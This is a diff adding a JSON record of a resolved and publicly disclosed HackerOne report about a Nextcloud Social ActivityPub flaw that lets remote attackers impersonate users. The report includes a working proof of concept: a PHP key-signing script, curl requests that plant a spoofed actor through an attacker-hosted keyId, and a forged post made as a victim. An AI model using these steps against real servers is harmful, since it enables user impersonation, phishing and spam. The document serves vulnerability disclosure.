@@ -1,0 +1,129 @@
+{
+  "id": 461308,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NjEzMDg=",
+  "url": "https://hackerone.com/reports/461308",
+  "title": "Remote attacker can impersonate Social users via ActivityPub API",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2018-12-12T15:31:47.965Z",
+  "submitted_at": "2018-12-12T15:31:47.965Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tomk",
+    "url": "/tomk",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-02-01T08:57:05.404Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-02-01T08:57:05.336Z",
+  "team_member_agreed_on_going_public_at": "2019-02-01T08:51:43.919Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi there! First up I want to acknowledge that Social may not be in scope. I emailed security@nextcloud.com, which pointed me here, and I wasn't sure whether to just put it in a GitHub issue. In any case I hope I'm not wasting your time.\n\nWhen an HTTP request arrives at the shared inbox endpoint there are problems in the Signature header checks. A remote unauthenticated attacker is able to partially impersonate users on the victim server. They can post messages on behalf of their victims, which will be visible in their own Home timelines and also in the Home timelines of any of their followers on the same server. Other actions are likely possible also, but this makes a clear example.\n\nI have verified the issue on Social 0.1.0 with NextCloud 15.0.0.\n\n* When an unknown remote Actor is downloaded using the keyId URL, the response's \"id\" field is not checked that it is from the same origin, which means it can be arbitrarily spoofed. This is the main problem.\n* When a Signature header is verified, any public key will do provided it comes from the correct origin, i.e., the key belongs to an Actor whose id has an origin that is somehow authoritative for the ActivityPub Item. This is normally okay since all the private keys for a given origin are on the same server. However due to the previous point, an attacker can insert their own pubkey for anybody else's server.\n\nThis is most clearly explained with steps to reproduce. Here I want to attack the server https://███████ and post a message impersonating \"testuser2\".\n\nFirst, I use a short PHP script `gen_request.php` that borrows some code from Social to generate a keypair, and give me a signature suitable for posting to the shared inbox.\n\n    <?php\n\n    // Use same key type and generation code as inside Nextcloud social\n    $res = openssl_pkey_new(\n            [\n                    \"digest_alg\"       => \"rsa\",\n                    \"private_key_bits\" => 2048,\n                    \"private_key_type\" => OPENSSL_KEYTYPE_RSA,\n            ]\n    );\n\n    openssl_pkey_export($res, $privateKey);\n    $publicKey = openssl_pkey_get_details($res)['key'];\n\n    // Generate a valid request\n    $data = \"(request-target): post /nextcloud/index.php/apps/social/inbox\";\n\n    openssl_sign($data, $signed, $privateKey, OPENSSL_ALGO_SHA256);\n    echo \"Shared inbox request, signed\\n\";\n    echo base64_encode($signed);\n    echo \"\\n\\n\";\n    echo \"Public key\\n\";\n    echo $publicKey;\n\n    ?>\n\nRunning this provides some material to use in the following requests.\n\n    Shared inbox request, signed\n    YHb7DroSsXgIFGuRFC5tRksVp1tayq+ZMeBP3vG6uNz8lStIjRhtCwzASStyRSrcm4DTlzuQzejQgQxJwq62bsPvzXzUGFub2yap3nyNFxtRbs/xTlpf1ySlhGDeMx1A9XjnEkp/j+wnCQF9j5h7SdnXG/1WSJe8SIBki+ONPwWqkyWRA1V/c76gJp349JnfVg0HkFuFGpIIe2A7Qk+Mbcq66aKx1WJedsL1SkeU3kSqSQIhYR4AvhXIHmj7E6Syg4o2/zHF0BaxbPHqS2VDSPajmE+gL+nhk/UTbOSUB6wzJkWng8ibWQ9Tz4UvYG/xUW8gdDtvU51x3nMfNmmXIQ==\n\n    Public key\n    -----BEGIN PUBLIC KEY-----\n    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmgjLAFCTvqwOCP1IW9Ik\n    peiTNBv49RC70dRXi4qpXLe+Sl2IR3O8YUiGzInRyyANM3nPWeHOH3bgF7WBmF5u\n    SaUgCga050woQC+DJkkVsjjmtz41z3FZyxRQN+x/zkJjQ96O94yWfXpam/hrW3Q2\n    WPHTEjKXyUfxIg0Ik0PcifvdZoCwQS+MbBDkKfToLw0vAhjKtE5zjT8VMwFj7yci\n    FpDzaKFHn4NQAr4SuznZW98zRom7XfcuDL5psa28W7S2Te2WVtCfUrkvbByESmN2\n    i3U5m0QjWUD34/IU03f+cyALKMNWesMl1mAj8NUfPgoGIa8ISlWYrjDzfGDjbbDc\n    /QIDAQAB\n    -----END PUBLIC KEY-----\n\nNext I download testuser2's user profile as a template.\n\n    $ curl -H \"Accept: application/ld+json\" -k https://████/nextcloud/index.php/apps/social/@testuser2\n\nEdit it so that the `id` field is changed to `@mallory`, and the public key is replaced with the one we generated. The rest can stay the same. (Truncated example)\n\n    {\"@context\":[\"https:\\/\\/www.w3.org\\/ns\\/activitystreams\",\"https:\\/\\/w3id.org\\/security\\/v1\"],\n    \"id\":\"https:\\/\\/█████\\/nextcloud\\/index.php\\/apps\\/social\\/@mallory\",\n    \"type\":\"Person\",\n    ...\n    +cyALKMNWesMl1mAj8NUfPgoGIa8ISlWYrjDzfGDjbbDc\\n/QIDAQAB\\n-----END PUBLIC KEY-----\\n\"}}\n\nI place this user JSON in a file on a web-accessible HTTPS server - in this case the URL is `https://███████/mallory.json`. I make the victim server download and process this user by using this URL as a keyId in a signature. The actual signature text and request body does not matter at this point. Verification will fail, but the user will be saved into the table \"oc_social_cache_actors\" with the \"id\" set to `https://████/nextcloud/index.php/apps/social/@mallory`. This makes it trusted for requests that concern origin ████.\n\n    $ curl -H 'Signature: keyId=\"https://██████/mallory.json\",headers=\"(request-target)\",signature=\"x\"' -H \"Accept: application/ld+json\" -X POST -d \"\" -k -i https://██████/nextcloud/index.php/apps/social/inbox\n    HTTP/1.1 500 Internal Server Error\n    ...\n    {\"status\":-1,\"exception\":\"OCA\\\\Social\\\\Exceptions\\\\SignatureException\",\"message\":\"signature cannot be checked\"}\n\nNow that mallory's pubkey is trusted, I can submit a Create-Note payload to the shared inbox. The signature for this request URL was already pre-calculated by the PHP script earlier.\n\nFor example,\n\n    $ curl -H 'Signature: keyId=\"https://███/nextcloud/index.php/apps/social/@mallory\",headers=\"(request-target)\",signature=\"YHb7DroSsXgIFGuRFC5tRksVp1tayq+ZMeBP3vG6uNz8lStIjRhtCwzASStyRSrcm4DTlzuQzejQgQxJwq62bsPvzXzUGFub2yap3nyNFxtRbs/xTlpf1ySlhGDeMx1A9XjnEkp/j+wnCQF9j5h7SdnXG/1WSJe8SIBki+ONPwWqkyWRA1V/c76gJp349JnfVg0HkFuFGpIIe2A7Qk+Mbcq66aKx1WJedsL1SkeU3kSqSQIhYR4AvhXIHmj7E6Syg4o2/zHF0BaxbPHqS2VDSPajmE+gL+nhk/UTbOSUB6wzJkWng8ibWQ9Tz4UvYG/xUW8gdDtvU51x3nMfNmmXIQ==\"' \\\n    -H \"Accept: application/ld+json\" \\\n    -X POST \\\n    -d \"{\\\"type\\\":\\\"Create\\\",\\\"actor\\\":\\\"https://█████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"to\\\":[\\\"https://www.w3.org/ns/activitystreams#Public\\\"],\\\"object\\\":{\\\"publishedTime\\\":1544622784,\\\"@context\\\":[\\\"https://www.w3.org/ns/activitystreams\\\",\\\"https://w3id.org/security/v1\\\"],\\\"id\\\":\\\"https://██████████/nextcloud/index.php/apps/social/@testuser2/15446114504147655329\\\",\\\"type\\\":\\\"Note\\\",\\\"to\\\":\\\"https://www.w3.org/ns/activitystreams#Public\\\",\\\"cc\\\":[\\\"https://████████/nextcloud/index.php/apps/social/@testuser2/followers\\\"],\\\"actor\\\":\\\"https://████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"actor_info\\\":{\\\"@context\\\":[\\\"https://www.w3.org/ns/activitystreams\\\",\\\"https://w3id.org/security/v1\\\"],\\\"id\\\":\\\"https://███████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"type\\\":\\\"Person\\\",\\\"url\\\":\\\"https://██████████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"local\\\":true,\\\"aliases\\\":[\\\"@testuser2\\\",\\\"users/testuser2\\\"],\\\"preferredUsername\\\":\\\"testuser2\\\",\\\"name\\\":\\\"\\\",\\\"inbox\\\":\\\"https://███/nextcloud/index.php/apps/social/@testuser2/inbox\\\",\\\"outbox\\\":\\\"https://███/nextcloud/index.php/apps/social/@testuser2/outbox\\\",\\\"account\\\":\\\"testuser2@█████\\\",\\\"following\\\":\\\"https://███████/nextcloud/index.php/apps/social/@testuser2/following\\\",\\\"followers\\\":\\\"https://█████/nextcloud/index.php/apps/social/@testuser2/followers\\\",\\\"endpoints\\\":{\\\"sharedInbox\\\":\\\"https://█████/nextcloud/index.php/apps/social/inbox\\\"},\\\"publicKey\\\":{\\\"id\\\":\\\"https://████████/nextcloud/index.php/apps/social/@testuser2#main-key\\\",\\\"owner\\\":\\\"https://████████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"publicKeyPem\\\":\\\"\\\"}},\\\"published\\\":\\\"2018-12-12T14:44:10+00:00\\\",\\\"local\\\":true,\\\"content\\\":\\\"not really testuser2\\\",\\\"attributedTo\\\":\\\"https://██████████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"inReplyTo\\\":\\\"\\\",\\\"sensitive\\\":false,\\\"conversation\\\":\\\"\\\"}}\" \\\n    -k -i \\\n    https://████/nextcloud/index.php/apps/social/inbox\n\nNow the payload \"not really testuser2\" appears in the Home timeline of their followers, like the admin user in the attached screenshot.\n\n## Impact\n\n* Phishing or malware links via seemingly trustworthy local or remote users\n* Spam/DoS\n* Possibly deleting content (untested)",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 389448,
+      "file_name": "admin_home.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/389/448/4199ce042385ae473a6c897a9279af5b34470659/admin_home.png?response-content-disposition=attachment%3B%20filename%3D%22admin_home.png%22%3B%20filename%2A%3DUTF-8%27%27admin_home.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQY7LT3C5B%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T182334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHkaCXVzLXdlc3QtMiJGMEQCIDjp3S6nk7SbulXZV8SfmO7l%2BZBsdw%2F4eQ3bg53sFbOPAiAfaTq6XH9yqPWX4DtyxToRnSegeuuuRH0GbxvWTSwKxiqyBQhCEAMaDDAxMzYxOTI3NDg0OSIMIyHHw7F1k%2FYwb7ycKo8FFsnA%2Fs0QuljqEeiJwXXrVua1i0DkKCFsyLOpqKnRSQW7OBHpKmZfSIxqOPsfDlfMIpVNbLoiCNmlW%2B5KUPVGSskfAA0I4g2%2Fq5Os6wc7Gil9nALVFcHLFL3WsBhSGTKGYMBaBeBBD49Brq3jPwqbLCD5zHTXqX89%2BoDhXVxoKz0voO%2BM9vAX0Qo25Rnv9rpSzuloCypzXqZhQRCuI3WtjuKg3WGOL7SfbGlUiMqpSBfL676JNtC7TsyP7NOs3Tu7eLmFaaymqNDVUOuVL5yC%2BkATR78VBiUYh1OcwYfr7TeJXQ6vuuDiAcigpG6V47nJKi0gVN8r14IDfpajOxQ%2Bpv24BCGxvynfGhLfIORAJq90OQrtCaWmUK%2BLWOSu1SrI%2FPZIl1DcRiopx%2BMPe92p5bKBNv2tFv8sy5qjKqccw0zimvyb%2B8tecdvQhi0iMAnLXxUZjkT2ATPLvqvS0ie%2BZPAoMYRlDqiBQAt58xCYsWtlRPtRkXYOm5FwXW9VT%2BSo4BVsSX3yR4OmWNy62iN6nrD2wgjdT3DhaOZY8cO4lPm9NbtQhDcAhOIud2lWjczfxpQ%2Fpk9uNZRmpRe4hwquZq9HwVVaClUCRmbPyC2qZvCy8MYW3SMesAVK2%2BkX6se1FWspEl4%2BobxURMHWrHgqtHtGWbpHHUHDGyCGi26fP060vofIM4fJJnDr8vi66fiQhN28wKHaETH9qxrQTn07gl%2Bs8xpm24YWrp4It1iXelw5Ut%2FmalJ9Y8i9HrxqfmuT6EMQ8gCh8DBZrgR3yn2RfRNJebfRLsjOLd8R5iWdXPKxxj9q5yAkffPV%2Bdhp%2BZ2Mp3lTd5E5U3Z7RgCGQlD21TPKHHBKxkwdZjtbkhySJzDBydjPBjqyAd%2B3a8YD%2FdhWjcQ0fvO3vJe1QLK0ot6xtf%2BOk8fl9LiqA0edSOSht8%2BWheOkYFcb1VGh8BhgeQO1IwQIckuQS4I9SywjLjwhGBscn%2BD%2BKwuzolji93ZE3ZDagswzWtP8aVz1HMGNXF7gdsHxtqDQNanjeNWoGHXUn9wNe%2FBGbfYLJ20NlgjLc75PCU%2BlBVocetQSZeOvq5n62jjVoe6xkjimWYnt%2FBXSPj8LIn6XRsDlets%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=33fa5f970df49024c02cf1cd04ec21658d2cc890f0bf8bedd934bc75c346ebfc",
+      "file_size": 53538,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-03-03T08:51:44.251Z",
+  "allow_singular_disclosure_after": -226143110.28829417,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "foobar7",
+    "ali",
+    "savitar0x01",
+    "asad0x01_",
+    "codeanddecode",
+    "khizer47",
+    "cyberunit",
+    "cryptographer",
+    "b73772bded7541989b54f6a",
+    "reppie",
+    "and 2 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 13,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
